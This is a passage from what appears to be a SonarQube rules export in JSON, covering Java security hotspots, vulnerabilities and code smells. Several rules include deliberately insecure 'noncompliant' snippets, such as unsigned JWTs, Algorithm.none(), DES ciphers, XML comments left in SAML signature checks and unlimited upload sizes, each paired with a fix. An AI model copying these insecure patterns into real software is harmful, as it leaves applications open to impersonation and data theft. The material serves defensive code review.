multipartResolver.setMaxUploadSize(104857600); // Sensitive (100MB)\n  return multipartResolver;\n}\n\n@Bean(name = \"multipartResolver\")\npublic CommonsMultipartResolver multipartResolver() {\n  CommonsMultipartResolver multipartResolver = new CommonsMultipartResolver(); // Sensitive, by default if maxUploadSize property is not defined, there is no limit and thus it's insecure\n  return multipartResolver;\n}\n\n@Bean\npublic MultipartConfigElement multipartConfigElement() {\n  MultipartConfigFactory factory = new MultipartConfigFactory(); // Sensitive, no limit by default\n  return factory.createMultipartConfig();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>File upload size is limited to 8 MB:</p>\n<pre>\n@Bean(name = \"multipartResolver\")\npublic CommonsMultipartResolver multipartResolver() {\n  multipartResolver.setMaxUploadSize(8388608); // Compliant (8 MB)\n  return multipartResolver;\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html\">Owasp Cheat Sheet</a> - Owasp Denial of Service\n  Cheat Sheet </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/770\">CWE-770 - Allocation of Resources Without Limits or Throttling</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5693","summary":"Allowing requests with excessive content length is security-sensitive","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<p>Disclosure of version information, usually overlooked by developers but disclosed by default by the systems and frameworks in use, can pose a\nsignificant security risk depending on the production environment.</p>\n<p>Once this information is public, attackers can use it to identify potential security holes or vulnerabilities specific to that version.</p>\n<p>Furthermore, if the published version information indicates the use of outdated or unsupported software, it becomes easier for attackers to exploit\nknown vulnerabilities. They can search for published vulnerabilities related to that version and launch attacks that specifically target those\nvulnerabilities.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Version information is accessible to end users. </li>\n  <li> Internal systems do not benefit from timely patch management workflows. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>In general, it is recommended to keep internal technical information within internal systems to control what attackers know about the underlying\narchitectures. This is known as the \"need to know\" principle.</p>\n<p>The most effective solution is to remove version information disclosure from what end users can see, such as the \"x-powered-by\" header.<br> This\ncan be achieved directly through the web application code, server (nginx, apache) or firewalls.</p>\n<p>Disabling the server signature provides additional protection by reducing the amount of information available to attackers. Note, however, that\nthis does not provide as much protection as regular updates and patches.<br> Security by obscurity is the least foolproof solution of all. It should\nnever be the only defense mechanism and should always be combined with other security measures.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n@GetMapping(value = \"/example\")\npublic ResponseEntity&lt;String&gt; example() {\n  HttpHeaders responseHeaders = new HttpHeaders();\n  responseHeaders.set(\"x-powered-by\", \"myproduct\"); // Sensitive\n\n  return new ResponseEntity&lt;String&gt;(\n      \"example\",\n      responseHeaders,\n      HttpStatus.CREATED);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>Do not disclose version information unless necessary. The <code>x-powered-by</code> or <code>Server</code> HTTP headers should not be used.</p>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a\n  href=\"https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.html\">OWASP Testing Guide - OTG-INFO-008</a> - Fingerprint Web Application Framework </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Information Exposure</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5689","summary":"Disclosing fingerprints from web application technologies is security-sensitive","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>The Security Assertion Markup Language (SAML) is a widely used standard in single sign-on systems. In a simplified version, the user authenticates\nto an Identity Provider which generates a signed SAML Response. This response is then forwarded to a Service Provider for validation and\nauthentication.</p>\n<h2>Why is this an issue?</h2>\n<p>If the Service Provider does not manage to properly validate the incoming SAML response message signatures, attackers might be able to manipulate\nthe response content without the application noticing. Especially, they might be able to alter the authentication-targeted user.</p>\n<h3>What is the potential impact?</h3>\n<p>By exploiting this vulnerability, an attacker can manipulate the SAML Response to impersonate a different user. This, in turn, can have various\nconsequences on the applicationâs security.</p>\n<h3>Unauthorized Access</h3>\n<p>Exploiting this vulnerability allows an attacker with authenticated access to impersonate other users within the SAML-based SSO system. This can\nlead to unauthorized access to sensitive information, resources, or functionalities the attacker should not have. By masquerading as legitimate users,\nthe attacker can bypass authentication mechanisms and gain unauthorized privileges, potentially compromising the entire system. By impersonating a\nuser with higher privileges, the attacker can gain access to additional resources. Privilege escalation can lead to further compromise of other\nsystems and unauthorized access to critical infrastructure.</p>\n<h3>Data Breaches</h3>\n<p>With the ability to impersonate other users, an attacker can gain access to sensitive data stored within the SAML-based SSO system. This includes\npersonally identifiable information (PII), financial data, intellectual property, or any other confidential information. Data breaches can result in\nreputational damage, legal consequences, financial losses, and harm to individuals whose data is exposed.</p>\n<h2>How to fix it in Spring</h2>\n<h3>Code examples</h3>\n<p>The following code examples are vulnerable because they explicitly include comments in signature checks. An attacker is able to change the field\nidentifying the authenticated user with XML comments.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport org.opensaml.xml.parse.StaticBasicParserPool;\nimport org.opensaml.xml.parse.ParserPool;\n\npublic ParserPool parserPool() {\n  StaticBasicParserPool staticBasicParserPool = new StaticBasicParserPool();\n  staticBasicParserPool.setIgnoreComments(false); // Noncompliant\n  return staticBasicParserPool;\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nimport org.opensaml.xml.parse.BasicParserPool;\nimport org.opensaml.xml.parse.ParserPool;\n\npublic ParserPool parserPool() {\n  BasicParserPool basicParserPool = new BasicParserPool();\n  basicParserPool.setIgnoreComments(false); // Noncompliant\n  return basicParserPool;\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport org.opensaml.xml.parse.StaticBasicParserPool;\nimport org.opensaml.xml.parse.ParserPool;\n\npublic ParserPool parserPool() {\n  return new StaticBasicParserPool();\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nimport org.opensaml.xml.parse.BasicParserPool;\nimport org.opensaml.xml.parse.ParserPool;\n\npublic ParserPool parserPool() {\n  return new BasicParserPool();\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> OpenSAML API - <a href=\"https://javadoc.io/doc/org.opensaml/xmltooling/latest/org/opensaml/xml/parse/BasicParserPool.html\">Class\n  BasicParserPool</a> </li>\n  <li> OpenSAML API - <a href=\"https://javadoc.io/doc/org.opensaml/xmltooling/latest/org/opensaml/xml/parse/StaticBasicParserPool.html\">Class\n  StaticBasicParserPool</a> </li>\n  <li> W3C Recommendation - <a href=\"https://www.w3.org/TR/xml-c14n11/\">Canonical XML Version 1.1</a> </li>\n  <li> W3C Recommendation - <a href=\"https://www.w3.org/TR/xmldsig-core1/\">XML Signature Syntax and Processing Version 1.1</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Cisco Duo - <a href=\"https://duo.com/blog/duo-finds-saml-vulnerabilities-affecting-multiple-implementations\">Duo Finds SAML Vulnerabilities\n  Affecting Multiple Implementations</a> </li>\n  <li> Spring blog - <a href=\"https://spring.io/blog/2018/03/01/spring-security-saml-and-this-week-s-saml-vulnerability\">Spring Security SAML and this\n  weekâs SAML Vulnerability</a> </li>\n  <li> Spring Security SAML - <a href=\"https://github.com/spring-projects/spring-security-saml/issues/228\">Issue #228 Multiple SAML libraries may\n  allow authentication bypass via incorrect XML canonicalization and DOM traversal</a> </li>\n  <li> CVE - <a href=\"https://www.cve.org/CVERecord?id=CVE-2017-11427\">CVE-2017-11427</a> </li>\n  <li> CVE - <a href=\"https://www.cve.org/CVERecord?id=CVE-2017-11428\">CVE-2017-11428</a> </li>\n  <li> CVE - <a href=\"https://www.cve.org/CVERecord?id=CVE-2017-11429\">CVE-2017-11429</a> </li>\n  <li> CVE - <a href=\"https://www.cve.org/CVERecord?id=CVE-2017-11430\">CVE-2017-11430</a> </li>\n  <li> CVE - <a href=\"https://www.cve.org/CVERecord?id=CVE-2018-0489\">CVE-2018-0489</a> </li>\n  <li> CVE - <a href=\"https://www.cve.org/CVERecord?id=CVE-2018-7340\">CVE-2018-7340</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5679","summary":"OpenSAML2 should be configured to prevent authentication bypass","tags":["spring"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Passing single <code>null</code> or primitive array argument to the variable arity method may not work as expected. In the case of\n<code>null</code>, it is not passed as array with single element, but the argument itself is <code>null</code>. In the case of a primitive array, if\nthe formal parameter is <code>Object...</code>, it is passed as a single element array. This may not be obvious to someone not familiar with such\ncorner cases, and it is probably better to avoid such ambiguities by explicitly casting the argument to the desired type.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nclass A {\n  public static void main(String[] args) {\n    vararg(null);  // Noncompliant, prints \"null\"\n    int[] arr = {1,2,3};\n    vararg(arr);  // Noncompliant, prints \"length: 1\"\n  }\n\n  static void vararg(Object... s) {\n    if (s == null) {\n      System.out.println(\"null\");\n    } else {\n      System.out.println(\"length: \" + s.length);\n    }\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nclass A {\n  public static void main(String[] args) {\n    vararg((Object) null); // prints 1\n    Object[] arr = {1,2,3};\n    vararg(arr); // prints 3\n  }\n\n  static void vararg(Object... s) {\n    if (s == null) {\n      System.out.println(\"null\"); // not reached\n    } else {\n      System.out.println(\"length: \" + s.length);\n    }\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5669","summary":"Vararg method arguments should not be confusing","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>The use of escape sequences is mostly unnecessary in text blocks.</p>\n<h3>Noncompliant code example</h3>\n<p><code>\\n</code> can be replaced by simply introducing the newline, <code>\\\"\\\"\\\"</code> it is sufficient to escape only the first qoute.</p>\n<pre>\nString textBlock = \"\"\"\n        \\\"\\\"\\\" this \\nis\n        text  block!\n        !!!!\n      \"\"\";\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nString textBlock = \"\"\"\n        \\\"\"\" this\n        is\n        text  block!\n        !!!!\n      \"\"\";\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://openjdk.java.net/jeps/378\">JEP 378: Text Blocks</a> </li>\n  <li> <a href=\"https://openjdk.org/projects/amber/guides/text-blocks-guide\">Programmerâs Guide To Text Blocks</a>, by Jim Laskey and Stuart Marks\n  </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5665","summary":"Escape sequences should not be used in text blocks","tags":["java14"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Either use only spaces or only tabs for the indentation of a text block. Mixing white space will lead to a result with irregular indentation.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nString textBlock = \"\"\"\n        this is\n&lt;tab&gt;text block!\n        !!!!\n      \"\"\";\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nString textBlock = \"\"\"\n        this is\n        text block!\n        !!!!\n      \"\"\";\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://openjdk.java.net/jeps/378\">JEP 378: Text Blocks</a> </li>\n  <li> <a href=\"https://openjdk.org/projects/amber/guides/text-blocks-guide\">Programmerâs Guide To Text Blocks</a>, by Jim Laskey and Stuart Marks\n  </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5664","summary":"Whitespace for text block indent should be consistent","tags":["java14"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FORMATTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>If a string fits on a single line, without concatenation and escaped newlines, you should probably continue to use a string literal.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nString question = \"\"\"\n              What's the point, really?\"\"\";\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nString question = \"What's the point, really?\";\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://openjdk.java.net/jeps/378\">JEP 378: Text Blocks</a> </li>\n  <li> <a href=\"https://openjdk.org/projects/amber/guides/text-blocks-guide\">Programmerâs Guide To Text Blocks</a>, by Jim Laskey and Stuart Marks\n  </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5663","summary":"Simple string literal should be used for single line strings","tags":["java14"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>This vulnerability allows forging of JSON Web Tokens to impersonate other users.</p>\n<h2>Why is this an issue?</h2>\n<p>JSON Web Tokens (JWTs), a popular method of securely transmitting information between parties as a JSON object, can become a significant security\nrisk when they are not properly signed with a robust cipher algorithm, left unsigned altogether, or if the signature is not verified. This\nvulnerability class allows malicious actors to craft fraudulent tokens, effectively impersonating user identities. In essence, the integrity of a JWT\nhinges on the strength and presence of its signature.</p>\n<h3>What is the potential impact?</h3>\n<p>When a JSON Web Token is not appropriately signed with a strong cipher algorithm or if the signature is not verified, it becomes a significant\nthreat to data security and the privacy of user identities.</p>\n<h4>Impersonation of users</h4>\n<p>JWTs are commonly used to represent user authorization claims. They contain information about the userâs identity, user roles, and access rights.\nWhen these tokens are not securely signed, it allows an attacker to forge them. In essence, a weak or missing signature gives an attacker the power to\ncraft a token that could impersonate any user. For instance, they could create a token for an administrator account, gaining access to high-level\npermissions and sensitive data.</p>\n<h4>Unauthorized data access</h4>\n<p>When a JWT is not securely signed, it can be tampered with by an attacker, and the integrity of the data it carries cannot be trusted. An attacker\ncan manipulate the content of the token and grant themselves permissions they should not have, leading to unauthorized data access.</p>\n<h2>How to fix it in Java JWT</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of JWT encoding and decoding without a strong cipher algorithm.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nimport io.jsonwebtoken.Jwts;\n\npublic void encode() {\n    Jwts.builder()\n        .setSubject(USER_LOGIN)\n        .compact(); // Noncompliant\n}\n</pre>\n<pre data-diff-id=\"12\" data-diff-type=\"noncompliant\">\nimport io.jsonwebtoken.Jwts;\n\npublic void decode() {\n    Jwts.parser()\n        .setSigningKey(SECRET_KEY)\n        .parse(token)\n        .getBody(); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nimport io.jsonwebtoken.Jwts;\n\npublic void encode() {\n    Jwts.builder()\n        .setSubject(USER_LOGIN)\n        .signWith(SignatureAlgorithm.HS256, SECRET_KEY)\n        .compact();\n}\n</pre>\n<p>When using <code>Jwts.parser()</code>, make sure to call <code>parseClaimsJws</code> instead of <code>parse</code> as it throws exceptions for\ninvalid or missing signatures.</p>\n<pre data-diff-id=\"12\" data-diff-type=\"compliant\">\nimport io.jsonwebtoken.Jwts;\n\npublic void decode() {\n    Jwts.parser()\n        .setSigningKey(SECRET_KEY)\n        .parseClaimsJws(token)\n        .getBody();\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Always sign your tokens</h4>\n<p>The foremost measure to enhance JWT security is to ensure that every JWT you issue is signed. Unsigned tokens are like open books that anyone can\ntamper with. Signing your JWTs ensures that any alterations to the tokens after they have been issued can be detected. Most JWT libraries support a\nsigning function, and using it is usually as simple as providing a secret key when the token is created.</p>\n<h4>Choose a strong cipher algorithm</h4>\n<p>It is not enough to merely sign your tokens. You need to sign them with a strong cipher algorithm. Algorithms like HS256 (HMAC using SHA-256) are\nconsidered secure for most purposes. But for an additional layer of security, you could use an algorithm like RS256 (RSA Signature with SHA-256),\nwhich uses a private key for signing and a public key for verification. This way, even if someone gains access to the public key, they will not be\nable to forge tokens.</p>\n<h4>Verify the signature of your tokens</h4>\n<p>Resolving a vulnerability concerning the validation of JWT token signatures is mainly about incorporating a critical step into your process:\nvalidating the signature every time a token is decoded. Just having a signed token using a secure algorithm is not enough. If you are not validating\nsignatures, they are not serving their purpose.</p>\n<p>Every time your application receives a JWT, it needs to decode the token to extract the information contained within. It is during this decoding\nprocess that the signature of the JWT should also be checked.</p>\n<p>To resolve the issue, follow these instructions:</p>\n<ol>\n  <li> Use framework-specific functions for signature verification: Most programming frameworks that support JWTs provide specific functions to not\n  only decode a token but also validate its signature simultaneously. Make sure to use these functions when handling incoming tokens. </li>\n  <li> Handle invalid signatures appropriately: If a JWTâs signature does not validate correctly, it means the token is not trustworthy, indicating\n  potential tampering. The action to take when encountering an invalid token should be denying the request carrying it and logging the event for\n  further investigation. </li>\n  <li> Incorporate signature validation in your tests: When you are writing tests for your application, include tests that check the signature\n  validation functionality. This can help you catch any instances where signature verification might be unintentionally skipped or bypassed. </li>\n</ol>\n<p>By following these practices, you can ensure the security of your applicationâs JWT handling process, making it resistant to attacks that rely on\ntampering with tokens. Validation of the signature needs to be an integral and non-negotiable part of your token handling process.</p>\n<h3>Going the extra mile</h3>\n<h4>Securely store your secret keys</h4>\n<p>Ensure that your secret keys are stored securely. They should not be hard-coded into your application code or checked into your version control\nsystem. Instead, consider using environment variables, secure key management systems, or vault services.</p>\n<h4>Rotate your secret keys</h4>\n<p>Even with the strongest cipher algorithms, there is a risk that your secret keys may be compromised. Therefore, it is a good practice to\nperiodically rotate your secret keys. By doing so, you limit the amount of time that an attacker can misuse a stolen key. When you rotate keys, be\nsure to allow a grace period where tokens signed with the old key are still accepted to prevent service disruptions.</p>\n<h2>How to fix it in Auth0 JWT</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of JWT encoding and decoding without a strong cipher algorithm.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport com.auth0.jwt.JWT;\n\npublic void encode() {\n    JWT.create()\n        .withSubject(SUBJECT)\n        .sign(Algorithm.none()); // Noncompliant\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nimport com.auth0.jwt.JWT;\n\npublic void decode() {\n    JWTVerifier verifier = JWT.require(Algorithm.none()) // Noncompliant\n        .withSubject(LOGIN)\n        .build();\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport com.auth0.jwt.JWT;\n\npublic void encode() {\n    JWT.create()\n        .withSubject(SUBJECT)\n        .sign(Algorithm.HMAC256(SECRET_KEY));\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nimport com.auth0.jwt.JWT;\n\npublic void decode() {\n    JWTVerifier verifier = JWT.require(Algorithm.HMAC256(SECRET_KEY))\n        .withSubject(LOGIN)\n        .build();\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Always sign your tokens</h4>\n<p>The foremost measure to enhance JWT security is to ensure that every JWT you issue is signed. Unsigned tokens are like open books that anyone can\ntamper with. Signing your JWTs ensures that any alterations to the tokens after they have been issued can be detected. Most JWT libraries support a\nsigning function, and using it is usually as simple as providing a secret key when the token is created.</p>\n<h4>Choose a strong cipher algorithm</h4>\n<p>It is not enough to merely sign your tokens. You need to sign them with a strong cipher algorithm. Algorithms like HS256 (HMAC using SHA-256) are\nconsidered secure for most purposes. But for an additional layer of security, you could use an algorithm like RS256 (RSA Signature with SHA-256),\nwhich uses a private key for signing and a public key for verification. This way, even if someone gains access to the public key, they will not be\nable to forge tokens.</p>\n<h4>Verify the signature of your tokens</h4>\n<p>Resolving a vulnerability concerning the validation of JWT token signatures is mainly about incorporating a critical step into your process:\nvalidating the signature every time a token is decoded. Just having a signed token using a secure algorithm is not enough. If you are not validating\nsignatures, they are not serving their purpose.</p>\n<p>Every time your application receives a JWT, it needs to decode the token to extract the information contained within. It is during this decoding\nprocess that the signature of the JWT should also be checked.</p>\n<p>To resolve the issue, follow these instructions:</p>\n<ol>\n  <li> Use framework-specific functions for signature verification: Most programming frameworks that support JWTs provide specific functions to not\n  only decode a token but also validate its signature simultaneously. Make sure to use these functions when handling incoming tokens. </li>\n  <li> Handle invalid signatures appropriately: If a JWTâs signature does not validate correctly, it means the token is not trustworthy, indicating\n  potential tampering. The action to take when encountering an invalid token should be denying the request carrying it and logging the event for\n  further investigation. </li>\n  <li> Incorporate signature validation in your tests: When you are writing tests for your application, include tests that check the signature\n  validation functionality. This can help you catch any instances where signature verification might be unintentionally skipped or bypassed. </li>\n</ol>\n<p>By following these practices, you can ensure the security of your applicationâs JWT handling process, making it resistant to attacks that rely on\ntampering with tokens. Validation of the signature needs to be an integral and non-negotiable part of your token handling process.</p>\n<h3>Going the extra mile</h3>\n<h4>Securely store your secret keys</h4>\n<p>Ensure that your secret keys are stored securely. They should not be hard-coded into your application code or checked into your version control\nsystem. Instead, consider using environment variables, secure key management systems, or vault services.</p>\n<h4>Rotate your secret keys</h4>\n<p>Even with the strongest cipher algorithms, there is a risk that your secret keys may be compromised. Therefore, it is a good practice to\nperiodically rotate your secret keys. By doing so, you limit the amount of time that an attacker can misuse a stolen key. When you rotate keys, be\nsure to allow a grace period where tokens signed with the old key are still accepted to prevent service disruptions.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/347\">CWE-347 - Improper Verification of Cryptographic Signature</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5659","summary":"JWT should be signed and verified with strong cipher algorithms","tags":["cwe","privacy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Lambdas (introduced with Java 8) are a very convenient and compact way to inject a behavior without having to create a dedicated class or method.\nBut those lambdas should be used only if the behavior to be injected can be defined in a few lines of code, otherwise the source code can quickly\nbecome unreadable.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-5612","summary":"Lambdas should not have too many lines","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for\nseveral important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in Java Cryptography Extension</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport javax.crypto.Cipher;\nimport java.security.NoSuchAlgorithmException;\nimport javax.crypto.NoSuchPaddingException;\n\npublic static void main(String[] args) {\n    try {\n        Cipher des = Cipher.getInstance(\"DES\"); // Noncompliant\n    } catch(NoSuchAlgorithmException|NoSuchPaddingException e) {\n        // ...\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport javax.crypto.Cipher;\nimport java.security.NoSuchAlgorithmException;\nimport javax.crypto.NoSuchPaddingException;\n\npublic static void main(String[] args) {\n    try {\n        Cipher aes = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    } catch(NoSuchAlgorithmException|NoSuchPaddingException e) {\n        // ...\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Use a secure algorithm</h4>\n<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an\nalgorithm is the Advanced Encryption Standard (AES).</p>\n<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mas.owasp.org/checklists/MASVS-CRYPTO/\">Mobile AppSec Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m10-insufficient-cryptography\">Mobile Top 10 2024 Category M10 -\n  Insufficient Cryptography</a> 